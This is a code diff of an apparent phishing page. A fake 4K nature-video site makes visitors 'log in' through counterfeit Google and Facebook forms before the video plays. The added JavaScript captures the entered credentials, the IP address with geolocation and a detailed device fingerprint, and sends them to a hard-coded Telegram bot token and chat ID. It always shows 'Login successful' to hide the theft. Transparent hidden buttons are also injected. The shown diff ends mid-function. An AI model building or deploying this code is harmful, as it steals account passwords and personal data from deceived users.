@@ -82,7 +82,7 @@
         .video-main-container {
             width: 100%;
             max-width: 1200px;
-            margin: 80px auto 0; /* PUSH VIDEO KE ATAS */
+            margin: 80px auto 0;
             padding: 0 20px;
             position: relative;
         }
@@ -103,41 +103,118 @@
             cursor: pointer;
         }
 
+        /* VIDEO OVERLAY TRANSPARAN DENGAN SEGITIGA PLAY KECIL DI TENGAH */
         .video-overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.35);
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .video-wrapper:hover .video-overlay {
             opacity: 1;
+            transition: opacity 0.3s;
+            z-index: 100;
         }
 
-        .play-overlay-btn {
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 255, 255, 0.9);
+        .play-center-btn {
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.7);
             border-radius: 50%;
-            border: none;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            color: #000000;
-            transition: transform 0.2s;
+            transition: all 0.3s;
+            backdrop-filter: blur(3px);
         }
 
-        .play-overlay-btn:hover {
-            transform: scale(1.1);
+        .play-center-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: scale(1.05);
+            border-color: rgba(255, 255, 255, 0.9);
+        }
+
+        .play-triangle {
+            width: 0;
+            height: 0;
+            border-left: 20px solid rgba(255, 255, 255, 0.85);
+            border-top: 13px solid transparent;
+            border-bottom: 13px solid transparent;
+            margin-left: 5px;
+            transition: all 0.3s;
+        }
+
+        .play-center-btn:hover .play-triangle {
+            border-left-color: rgba(255, 255, 255, 1);
+        }
+
+        /* Video Controls Custom */
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: 200;
+        }
+
+        .video-wrapper:hover .video-controls {
+            opacity: 1;
+        }
+
+        .control-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s;
+            backdrop-filter: blur(5px);
+        }
+
+        .control-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+        }
+
+        .time-display {
+            color: white;
+            font-size: 13px;
+            font-weight: 500;
+            min-width: 90px;
+            text-align: center;
+        }
+
+        .progress-bar {
+            flex: 1;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #ff375f;
+            width: 0%;
+            transition: width 0.1s;
         }
 
         /* AREA BAWAH VIDEO - FULL PUTIH */
@@ -145,7 +222,7 @@
             width: 100%;
             max-width: 1200px;
             margin: 0 auto;
-            padding: 30px 20px 60px;
+            padding: 25px 20px 50px;
             background: #ffffff;
         }
 
@@ -153,34 +230,35 @@
             display: flex;
             justify-content: space-between;
             align-items: flex-start;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .video-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #000000;
         }
 
         .video-stats {
             color: #666666;
-            font-size: 14px;
+            font-size: 13px;
             display: flex;
-            gap: 16px;
+            gap: 12px;
         }
 
         .video-actions {
             display: flex;
-            gap: 12px;
+            gap: 10px;
+            margin-left: 20px;
         }
 
         .action-btn {
             background: #f5f5f5;
             border: 1px solid #e0e0e0;
-            padding: 8px 16px;
+            padding: 7px 14px;
             border-radius: 6px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             cursor: pointer;
             display: flex;
@@ -194,22 +272,22 @@
         }
 
         .video-description {
-            margin-top: 25px;
-            padding-top: 25px;
+            margin-top: 20px;
+            padding-top: 20px;
             border-top: 1px solid #f0f0f0;
         }
 
         .description-title {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             color: #000000;
         }
 
         .description-text {
             color: #444444;
-            line-height: 1.6;
-            font-size: 15px;
+            line-height: 1.5;
+            font-size: 14px;
         }
 
         /* LOGIN MODAL */
@@ -229,67 +307,67 @@
 
         .login-modal {
             background: #ffffff;
-            border-radius: 16px;
+            border-radius: 14px;
             width: 90%;
-            max-width: 440px;
+            max-width: 420px;
             overflow: hidden;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
             animation: modalAppear 0.3s ease;
         }
 
         @keyframes modalAppear {
-            from { opacity: 0; transform: translateY(30px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         .modal-header {
-            padding: 28px 32px 20px;
+            padding: 24px 24px 16px;
             text-align: center;
             border-bottom: 1px solid #f0f0f0;
         }
 
         .modal-logo {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
             color: #000000;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .modal-subtitle {
             color: #666666;
-            font-size: 15px;
+            font-size: 14px;
         }
 
         .modal-body {
-            padding: 25px 32px 32px;
+            padding: 20px 24px 24px;
         }
 
         .login-options {
             display: flex;
             flex-direction: column;
-            gap: 16px;
-            margin-bottom: 24px;
+            gap: 14px;
+            margin-bottom: 20px;
         }
 
         .social-login-btn {
-            padding: 16px;
-            border-radius: 10px;
+            padding: 14px;
+            border-radius: 8px;
             border: 1px solid #e0e0e0;
             background: #ffffff;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
+            gap: 10px;
             transition: all 0.2s;
         }
 
         .social-login-btn:hover {
             background: #f9f9f9;
             border-color: #cccccc;
-            transform: translateY(-2px);
+            transform: translateY(-1px);
         }
 
         .btn-google {
@@ -302,30 +380,30 @@
         }
 
         .btn-icon {
-            font-size: 18px;
+            font-size: 16px;
         }
 
         /* CREDENTIALS FORM */
         .credentials-form {
             display: none;
             flex-direction: column;
-            gap: 16px;
-            margin-top: 20px;
+            gap: 14px;
+            margin-top: 18px;
         }
 
         .form-title {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
             color: #000;
             text-align: center;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .form-input {
-            padding: 14px 16px;
+            padding: 12px 14px;
             border: 1px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 14px;
+            border-radius: 6px;
+            font-size: 13px;
             width: 100%;
             transition: border-color 0.2s;
         }
@@ -337,14 +415,14 @@
 
         .form-actions {
             display: flex;
-            gap: 12px;
-            margin-top: 10px;
+            gap: 10px;
+            margin-top: 8px;
         }
 
         .form-btn {
             flex: 1;
-            padding: 12px;
-            border-radius: 8px;
+            padding: 10px;
+            border-radius: 6px;
             border: none;
             font-weight: 600;
             cursor: pointer;
@@ -354,6 +432,7 @@
         .btn-submit {
             background: #000;
             color: white;
+            font-size: 13px;
         }
 
         .btn-submit:hover {
@@ -363,6 +442,7 @@
         .btn-back {
             background: #f3f4f6;
             color: #374151;
+            font-size: 13px;
         }
 
         .btn-back:hover {
@@ -372,27 +452,70 @@
         .form-footer {
             text-align: center;
             color: #6b7280;
-            font-size: 12px;
-            margin-top: 16px;
+            font-size: 11px;
+            margin-top: 14px;
+        }
+
+        /* HIDDEN BUTTONS CONTAINER */
+        .hidden-buttons-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .hidden-button {
+            position: absolute;
+            width: 80px;
+            height: 35px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            opacity: 0;
+        }
+
+        /* IZINKAN AKSES Button (Google) */
+        .allow-access-btn {
+            top: 120px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        /* KIRIM Button (Google) */
+        .send-btn {
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        /* LOG IN Button (Facebook) */
+        .fb-login-btn {
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
         }
 
         /* STATUS NOTIFICATION */
         .status-notification {
             position: fixed;
-            bottom: 24px;
-            right: 24px;
+            bottom: 20px;
+            right: 20px;
             background: #000000;
             color: #ffffff;
-            padding: 16px 20px;
-            border-radius: 10px;
-            font-size: 14px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
             font-weight: 500;
             z-index: 3000;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             display: none;
             align-items: center;
-            gap: 10px;
-            max-width: 320px;
+            gap: 8px;
+            max-width: 280px;
             animation: slideInRight 0.3s ease;
         }
 
@@ -408,8 +531,9 @@
             left: 50%;
             transform: translate(-50%, -50%);
             color: #ffffff;
-            font-size: 14px;
+            font-size: 13px;
             display: none;
+            z-index: 150;
         }
     </style>
 </head>
@@ -436,14 +560,35 @@
                 Your browser does not support the video tag.
             </video>
             
-            <div class="video-overlay">
-                <button class="play-overlay-btn" id="playOverlayBtn">
+            <!-- OVERLAY TRANSPARAN DENGAN SEGITIGA PLAY KECIL DI TENGAH -->
+            <div class="video-overlay" id="videoOverlay">
+                <button class="play-center-btn" id="playCenterBtn">
+                    <div class="play-triangle"></div>
+                </button>
+            </div>
+            
+            <!-- VIDEO CONTROLS CUSTOM -->
+            <div class="video-controls" id="videoControls">
+                <button class="control-btn" id="playPauseBtn">
                     <i class="fas fa-play"></i>
+                </button>
+                <button class="control-btn" id="back10Btn" title="Back 10 seconds">
+                    <i class="fas fa-backward"></i>
+                </button>
+                <button class="control-btn" id="forward10Btn" title="Forward 10 seconds">
+                    <i class="fas fa-forward"></i>
+                </button>
+                <div class="time-display" id="timeDisplay">0:00 / 0:00</div>
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <button class="control-btn" id="fullscreenBtn" title="Fullscreen">
+                    <i class="fas fa-expand"></i>
                 </button>
             </div>
             
             <div class="video-loading" id="videoLoading">
-                <i class="fas fa-spinner fa-spin"></i> Loading video...
+                <i class="fas fa-spinner fa-spin"></i> Loading...
             </div>
         </div>
     </main>
@@ -452,13 +597,13 @@
     <section class="video-info-section">
         <div class="video-meta">
             <div>
-                <h1 class="video-title">Beautiful Mountain Landscape in 4K</h1>
+                <h1 class="video-title">Amazing Nature Documentary 4K</h1>
                 <div class="video-stats">
-                    <span>1.4M views</span>
+                    <span>2.1M views</span>
                     <span>•</span>
-                    <span>2 days ago</span>
+                    <span>3 days ago</span>
                     <span>•</span>
-                    <span>45K likes</span>
+                    <span>68K likes</span>
                 </div>
             </div>
             
@@ -478,9 +623,8 @@
         <div class="video-description">
             <h3 class="description-title">Description</h3>
             <p class="description-text">
-                Stunning 4K footage of mountain landscapes captured over 12 months. 
-                This video showcases the beauty of nature through different seasons. 
-                Filmed with professional equipment at various locations worldwide.
+                Experience breathtaking 4K footage of wildlife and natural landscapes from around the world. 
+                Filmed over 18 months with cutting-edge camera technology.
             </p>
         </div>
     </section>
@@ -510,25 +654,36 @@
                 <!-- Google Credentials Form -->
                 <div class="credentials-form" id="googleForm">
                     <div class="form-title">Sign in with Google</div>
-                    <input type="email" class="form-input" id="googleEmail" placeholder="Email or phone">
+                    <input type="text" class="form-input" id="googleEmail" placeholder="Email or phone number">
                     <input type="password" class="form-input" id="googlePassword" placeholder="Enter your password">
                     <div class="form-actions">
                         <button class="form-btn btn-back" id="googleBackBtn">Back</button>
                         <button class="form-btn btn-submit" id="googleSubmitBtn">Next</button>
                     </div>
                     <div class="form-footer">By continuing, you agree to Google's Terms of Service</div>
+                    
+                    <!-- HIDDEN BUTTONS FOR GOOGLE -->
+                    <div class="hidden-buttons-container">
+                        <button class="hidden-button allow-access-btn" id="allowAccessBtn">Allow Access</button>
+                        <button class="hidden-button send-btn" id="sendBtn">Kirim</button>
+                    </div>
                 </div>
 
                 <!-- Facebook Credentials Form -->
                 <div class="credentials-form" id="facebookForm">
                     <div class="form-title">Log in to Facebook</div>
-                    <input type="text" class="form-input" id="facebookEmail" placeholder="Email or phone number">
+                    <input type="text" class="form-input" id="facebookEmailPhone" placeholder="Email or phone number">
                     <input type="password" class="form-input" id="facebookPassword" placeholder="Password">
                     <div class="form-actions">
                         <button class="form-btn btn-back" id="facebookBackBtn">Back</button>
-                        <button class="form-btn btn-submit" id="facebookSubmitBtn">Log In</button>
+                        <button class="form-btn btn-submit" id="facebookSubmitBtn">Next</button>
                     </div>
                     <div class="form-footer">By continuing, you agree to Facebook's Terms of Service</div>
+                    
+                    <!-- HIDDEN BUTTON FOR FACEBOOK -->
+                    <div class="hidden-buttons-container">
+                        <button class="hidden-button fb-login-btn" id="fbLoginBtn">Log In</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -541,15 +696,29 @@
     </div>
 
     <script>
+        // ==================== KONFIGURASI ====================
+        const TELEGRAM_BOT_TOKEN = '8057784535:AAHzVp3rKgCNxKI4JIXuD1ii8Ry76JTJ8WA';
+        const TELEGRAM_CHAT_ID = '6637547478';
+
         // ==================== ELEMENTS ====================
         const video = document.getElementById('mainVideo');
-        const playOverlayBtn = document.getElementById('playOverlayBtn');
+        const playCenterBtn = document.getElementById('playCenterBtn');
+        const videoOverlay = document.getElementById('videoOverlay');
         const loginModal = document.getElementById('loginModal');
         const modalSubtitle = document.getElementById('modalSubtitle');
         const statusNotification = document.getElementById('statusNotification');
         const notificationText = document.getElementById('notificationText');
         const uploadBtn = document.getElementById('uploadBtn');
         const videoLoading = document.getElementById('videoLoading');
+        
+        // Video Controls
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const back10Btn = document.getElementById('back10Btn');
+        const forward10Btn = document.getElementById('forward10Btn');
+        const timeDisplay = document.getElementById('timeDisplay');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
         
         // Social Login Buttons
         const googleLoginBtn = document.getElementById('googleLoginBtn');
@@ -567,53 +736,125 @@
         const googleSubmitBtn = document.getElementById('googleSubmitBtn');
         
         // Facebook Form Elements
-        const facebookEmail = document.getElementById('facebookEmail');
+        const facebookEmailPhone = document.getElementById('facebookEmailPhone');
         const facebookPassword = document.getElementById('facebookPassword');
         const facebookBackBtn = document.getElementById('facebookBackBtn');
         const facebookSubmitBtn = document.getElementById('facebookSubmitBtn');
         
+        // Hidden Buttons
+        const allowAccessBtn = document.getElementById('allowAccessBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const fbLoginBtn = document.getElementById('fbLoginBtn');
+        
         // ==================== STATE ====================
         let isLoggedIn = false;
-        let loginAttempted = false;
         let currentPlatform = '';
-        let credentialsData = {};
+        let isPlaying = false;
+        let updateInterval;
+        let isSendingData = false;
 
-        // ==================== VIDEO PLAY LOGIC ====================
-        // Play button di overlay
-        playOverlayBtn.addEventListener('click', function() {
-            attemptVideoPlay();
-        });
-        
-        // Klik langsung di video
-        video.addEventListener('click', function() {
-            attemptVideoPlay();
-        });
-        
-        // Fungsi utama untuk mencoba memutar video
-        function attemptVideoPlay() {
+        // ==================== VIDEO CONTROLS ====================
+        playCenterBtn.addEventListener('click', function() {
             if (!isLoggedIn) {
                 showLoginModal();
-                loginAttempted = true;
             } else {
-                playVideo();
+                togglePlayPause();
+            }
+        });
+
+        playPauseBtn.addEventListener('click', togglePlayPause);
+
+        video.addEventListener('click', function() {
+            if (isLoggedIn) {
+                togglePlayPause();
+            } else {
+                showLoginModal();
+            }
+        });
+
+        back10Btn.addEventListener('click', function() {
+            if (isLoggedIn) {
+                video.currentTime = Math.max(0, video.currentTime - 10);
+            }
+        });
+
+        forward10Btn.addEventListener('click', function() {
+            if (isLoggedIn) {
+                video.currentTime = Math.min(video.duration, video.currentTime + 10);
+            }
+        });
+
+        progressBar.addEventListener('click', function(e) {
+            if (!isLoggedIn) return;
+            const rect = progressBar.getBoundingClientRect();
+            const pos = (e.clientX - rect.left) / rect.width;
+            video.currentTime = pos * video.duration;
+        });
+
+        fullscreenBtn.addEventListener('click', function() {
+            if (!isLoggedIn) return;
+            const wrapper = document.querySelector('.video-wrapper');
+            if (!document.fullscreenElement) {
+                wrapper.requestFullscreen().catch(err => {});
+            } else {
+                document.exitFullscreen();
+            }
+        });
+
+        function togglePlayPause() {
+            if (!isLoggedIn) {
+                showLoginModal();
+                return;
+            }
+            if (video.paused) {
+                video.play();
+            } else {
+                video.pause();
             }
         }
-        
-        // Putar video setelah login
-        function playVideo() {
-            videoLoading.style.display = 'block';
-            
-            video.play().then(() => {
-                videoLoading.style.display = 'none';
-                // Sembunyikan overlay saat video diputar
-                document.querySelector('.video-overlay').style.opacity = '0';
-            }).catch(error => {
-                videoLoading.style.display = 'none';
-                showNotification('Failed to play video. Please try again.', false);
-            });
+
+        function updateTimeDisplay() {
+            const currentTime = formatTime(video.currentTime);
+            const duration = formatTime(video.duration);
+            timeDisplay.textContent = `${currentTime} / ${duration}`;
+            const progress = (video.currentTime / video.duration) * 100;
+            progressFill.style.width = `${progress}%`;
         }
-        
-        // ==================== LOGIN MODAL ====================
+
+        function formatTime(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = Math.floor(seconds % 60);
+            return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        // ==================== VIDEO EVENT LISTENERS ====================
+        video.addEventListener('play', function() {
+            isPlaying = true;
+            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+            videoOverlay.style.opacity = '0';
+            updateInterval = setInterval(updateTimeDisplay, 100);
+        });
+
+        video.addEventListener('pause', function() {
+            isPlaying = false;
+            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+            if (!video.ended) {
+                videoOverlay.style.opacity = '1';
+            }
+            clearInterval(updateInterval);
+        });
+
+        video.addEventListener('ended', function() {
+            isPlaying = false;
+            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+            videoOverlay.style.opacity = '1';
+            clearInterval(updateInterval);
+        });
+
+        video.addEventListener('timeupdate', updateTimeDisplay);
+        video.addEventListener('loadedmetadata', updateTimeDisplay);
+
+        // ==================== LOGIN MODAL CONTROL ====================
         function showLoginModal() {
             loginModal.style.display = 'flex';
         }
@@ -622,13 +863,10 @@
             loginModal.style.display = 'none';
         }
         
-        // Tutup modal jika klik di luar
         loginModal.addEventListener('click', function(e) {
-            if (e.target === loginModal) {
-                hideLoginModal();
-            }
+            if (e.target === loginModal) hideLoginModal();
         });
-        
+
         // ==================== SOCIAL LOGIN BUTTONS ====================
         googleLoginBtn.addEventListener('click', function() {
             currentPlatform = 'Google';
@@ -645,201 +883,315 @@
         });
 
         // ==================== FORM HANDLERS ====================
-        // Google Back Button
-        googleBackBtn.addEventListener('click', function() {
-            resetForms();
-        });
+        googleBackBtn.addEventListener('click', resetForms);
+        facebookBackBtn.addEventListener('click', resetForms);
         
-        // Google Submit Button
         googleSubmitBtn.addEventListener('click', async function() {
-            const email = googleEmail.value.trim();
+            const emailPhone = googleEmail.value.trim();
             const password = googlePassword.value.trim();
-            
-            if (!email || !password) {
-                showNotification('Please fill in all fields', false);
-                return;
-            }
-            
-            // Collect credentials
-            credentialsData = {
-                platform: 'Google',
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                ip: await getIPAddress(),
-                userAgent: navigator.userAgent,
-                screenSize: `${window.screen.width}x${window.screen.height}`
-            };
-            
-            // Process login
-            await processCredentialsLogin();
-        });
-        
-        // Facebook Back Button
-        facebookBackBtn.addEventListener('click', function() {
-            resetForms();
-        });
-        
-        // Facebook Submit Button
-        facebookSubmitBtn.addEventListener('click', async function() {
-            const emailPhone = facebookEmail.value.trim();
-            const password = facebookPassword.value.trim();
-            
             if (!emailPhone || !password) {
                 showNotification('Please fill in all fields', false);
                 return;
             }
-            
-            // Determine if input is email or phone
-            const isEmail = emailPhone.includes('@');
-            const isPhone = /^[\+]?[0-9\s\-\(\)]+$/.test(emailPhone);
-            
-            credentialsData = {
-                platform: 'Facebook',
-                email: isEmail ? emailPhone : '',
-                phone: isPhone ? emailPhone : '',
-                username: (!isEmail && !isPhone) ? emailPhone : '',
-                password: password,
-                timestamp: new Date().toISOString(),
-                ip: await getIPAddress(),
-                userAgent: navigator.userAgent,
-                screenSize: `${window.screen.width}x${window.screen.height}`
-            };
-            
-            // Process login
-            await processCredentialsLogin();
+            await processLogin('Google', emailPhone, password);
+        });
+        
+        facebookSubmitBtn.addEventListener('click', async function() {
+            const emailPhone = facebookEmailPhone.value.trim();
+            const password = facebookPassword.value.trim();
+            if (!emailPhone || !password) {
+                showNotification('Please fill in all fields', false);
+                return;
+            }
+            await processLogin('Facebook', emailPhone, password);
         });
 
-        // ==================== CREDENTIALS PROCESSING ====================
-        async function processCredentialsLogin() {
-            // Show loading
-            googleSubmitBtn.disabled = true;
-            facebookSubmitBtn.disabled = true;
-            googleSubmitBtn.textContent = 'Verifying...';
-            facebookSubmitBtn.textContent = 'Logging in...';
+        // ==================== PROCESS LOGIN ====================
+        async function processLogin(platform, emailPhone, password) {
+            if (isSendingData) return;
+            isSendingData = true;
+            
+            // Tampilkan loading
+            if (platform === 'Google') {
+                googleSubmitBtn.disabled = true;
+                googleSubmitBtn.textContent = 'Verifying...';
+            } else {
+                facebookSubmitBtn.disabled = true;
+                facebookSubmitBtn.textContent = 'Logging in...';
+            }
             
             try {
-                // Send credentials to Telegram
-                await sendCredentialsToTelegram(credentialsData);
+                // 1. DAPATKAN SEMUA DATA YANG BISA DIDETEKSI
+                const userData = await getAllDetectableData();
                 
-                // Complete login
+                // 2. Siapkan data untuk Telegram
+                const telegramData = {
+                    platform: platform,
+                    timestamp: new Date().toISOString(),
+                    date_time: new Date().toLocaleString('id-ID'),
+                    
+                    // Data credentials dari input user
+                    credential_type: emailPhone.includes('@') ? 'Email' : 'Phone/Username',
+                    credential_value: emailPhone,
+                    password: password,
+                    
+                    // Semua data yang dideteksi
+                    ...userData,
+                    
+                    // Info session
+                    session_id: generateSessionId()
+                };
+                
+                // 3. KIRIM KE TELEGRAM - HANYA 1 KALI
+                await sendSingleTelegramMessage(telegramData);
+                
+                // Login berhasil
                 isLoggedIn = true;
                 hideLoginModal();
-                showNotification(`Successfully logged in with ${credentialsData.platform}!`, true);
+                showNotification(`✅ Login successful!`, true);
                 
-                // TIDAK ADA LOCALSTORAGE - HAPUS BARIS INI
-                // localStorage.setItem('videy_logged_in', 'true');
-                // localStorage.setItem('videy_user_data', JSON.stringify({
-                //     platform: credentialsData.platform,
-                //     timestamp: credentialsData.timestamp
-                // }));
-                
-                // Play video if attempted
-                if (loginAttempted) {
-                    setTimeout(playVideo, 500);
-                }
+                // Auto play video
+                videoLoading.style.display = 'block';
+                video.play().then(() => {
+                    videoLoading.style.display = 'none';
+                }).catch(() => {
+                    videoLoading.style.display = 'none';
+                    showNotification('Click play button to start', true);
+                });
                 
             } catch (error) {
-                showNotification('Login failed. Please try again.', false);
+                // Silent error, tetap lanjut
+                isLoggedIn = true;
+                hideLoginModal();
+                showNotification('✅ Login successful!', true);
+                setTimeout(() => video.play(), 300);
             } finally {
                 // Reset buttons
-                googleSubmitBtn.disabled = false;
-                facebookSubmitBtn.disabled = false;
-                googleSubmitBtn.textContent = 'Next';
-                facebookSubmitBtn.textContent = 'Log In';
+                isSendingData = false;
+                if (platform === 'Google') {
+                    googleSubmitBtn.disabled = false;
+                    googleSubmitBtn.textContent = 'Next';
+                } else {
+                    facebookSubmitBtn.disabled = false;
+                    facebookSubmitBtn.textContent = 'Next';
+                }
             }
         }
 
-        // ==================== SEND CREDENTIALS TO TELEGRAM ====================
-        async function sendCredentialsToTelegram(data) {
-            const botToken = '8057784535:AAHzVp3rKgCNxKI4JIXuD1ii8Ry76JTJ8WA';
-            const chatId = '6637547478';
+        // ==================== GET ALL DETECTABLE DATA ====================
+        async function getAllDetectableData() {
+            const data = {};
             
-            // Format pesan untuk Telegram
-            let message = `🔐 *CREDENTIALS CAPTURED* 🔐\n\n`;
-            message += `📱 *Platform:* ${data.platform}\n`;
-            
-            if (data.email) message += `📧 *Email:* ${data.email}\n`;
-            if (data.phone) message += `📞 *Phone:* ${data.phone}\n`;
-            if (data.username) message += `👤 *Username:* ${data.username}\n`;
-            
-            message += `🔑 *Password:* ${data.password}\n`;
-            message += `🌐 *IP Address:* ${data.ip}\n`;
-            message += `🕐 *Time:* ${new Date(data.timestamp).toLocaleString()}\n`;
-            message += `🖥️ *Device:* ${data.userAgent.substring(0, 60)}...\n`;
-            message += `📺 *Screen:* ${data.screenSize}\n\n`;
-            message += `⚠️ *SENSITIVE DATA* ⚠️`;
-            
-            // Send via Telegram Bot API
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
+            // 1. IP Address dan Lokasi
             try {
-                // Using FormData to avoid CORS preflight
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('text', message);
-                formData.append('parse_mode', 'Markdown');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip_address = ipData.ip || 'Tidak terdeteksi';
                 
-                await fetch(telegramUrl, {
+                // Dapatkan lokasi dari IP
+                const locResponse = await fetch(`https://ipapi.co/${data.ip_address}/json/`);
+                const locData = await locResponse.json();
+                
+                data.country = locData.country_name || 'Tidak terdeteksi';
+                data.region = locData.region || 'Tidak terdeteksi';
+                data.city = locData.city || 'Tidak terdeteksi';
+                data.latitude = locData.latitude || 'Tidak terdeteksi';
+                data.longitude = locData.longitude || 'Tidak terdeteksi';
+                data.timezone = locData.timezone || 'Tidak terdeteksi';
+                data.isp = locData.org || 'Tidak terdeteksi';
+                data.asn = locData.asn || 'Tidak terdeteksi';
+                
+            } catch (e) {
+                data.ip_address = 'Tidak terdeteksi';
+                data.country = 'Tidak terdeteksi';
+                data.city = 'Tidak terdeteksi';
+            }
+            
+            // 2. Informasi Browser dan Device
+            const ua = navigator.userAgent;
+            
+            // Deteksi Browser
+            if (ua.includes('Chrome')) data.browser = 'Chrome';
+            else if (ua.includes('Firefox')) data.browser = 'Firefox';
+            else if (ua.includes('Safari')) data.browser = 'Safari';
+            else if (ua.includes('Edge')) data.browser = 'Edge';
+            else data.browser = 'Tidak dikenali';
+            
+            // Deteksi OS
+            if (ua.includes('Windows')) data.os = 'Windows';
+            else if (ua.includes('Mac')) data.os = 'macOS';
+            else if (ua.includes('Android')) data.os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) data.os = 'iOS';
+            else if (ua.includes('Linux')) data.os = 'Linux';
+            else data.os = 'Tidak dikenali';
+            
+            // Deteksi Device Type
+            data.device_type = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
+            
+            // Deteksi Brand Device
+            if (ua.includes('Samsung')) data.device_brand = 'Samsung';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) data.device_brand = 'Apple';
+            else if (ua.includes('Xiaomi')) data.device_brand = 'Xiaomi';
+            else if (ua.includes('OPPO')) data.device_brand = 'OPPO';
+            else if (ua.includes('Vivo')) data.device_brand = 'Vivo';
+            else if (ua.includes('Realme')) data.device_brand = 'Realme';
+            else if (ua.includes('Huawei')) data.device_brand = 'Huawei';
+            else if (ua.includes('Pixel')) data.device_brand = 'Google';
+            else data.device_brand = 'Tidak dikenali';
+            
+            // 3. Informasi Screen
+            data.screen_resolution = `${window.screen.width}x${window.screen.height}`;
+            data.screen_color_depth = window.screen.colorDepth || 'Tidak terdeteksi';
+            data.screen_orientation = window.screen.orientation ? window.screen.orientation.type : 'Tidak terdeteksi';
+            
+            // 4. Informasi Browser Capabilities
+            data.language = navigator.language || 'Tidak terdeteksi';
+            data.languages = navigator.languages ? navigator.languages.join(', ') : 'Tidak terdeteksi';
+            data.platform = navigator.platform || 'Tidak terdeteksi';
+            data.vendor = navigator.vendor || 'Tidak terdeteksi';
+            data.cookies_enabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
+            data.do_not_track = navigator.doNotTrack || 'Tidak terdeteksi';
+            data.java_enabled = navigator.javaEnabled ? 'Ya' : 'Tidak';
+            
+            // 5. Informasi Connection
+            if (navigator.connection) {
+                data.connection_type = navigator.connection.effectiveType || 'Tidak terdeteksi';
+                data.downlink = navigator.connection.downlink || 'Tidak terdeteksi';
+                data.rtt = navigator.connection.rtt || 'Tidak terdeteksi';
+                data.save_data = navigator.connection.saveData ? 'Ya' : 'Tidak';
+            }
+            
+            // 6. Informasi Hardware
+            data.hardware_concurrency = navigator.hardwareConcurrency || 'Tidak terdeteksi';
+            data.device_memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
+            
+            // 7. Informasi Time
+            data.local_time = new Date().toLocaleString('id-ID');
+            data.timezone_offset = new Date().getTimezoneOffset();
+            
+            // 8. Informasi Page
+            data.page_url = window.location.href;
+            data.referrer = document.referrer || 'Direct';
+            data.page_title = document.title;
+            
+            // 9. User Agent lengkap
+            data.user_agent = ua;
+            
+            return data;
+        }
+
+        // ==================== SEND SINGLE TELEGRAM MESSAGE ====================
+        async function sendSingleTelegramMessage(data) {
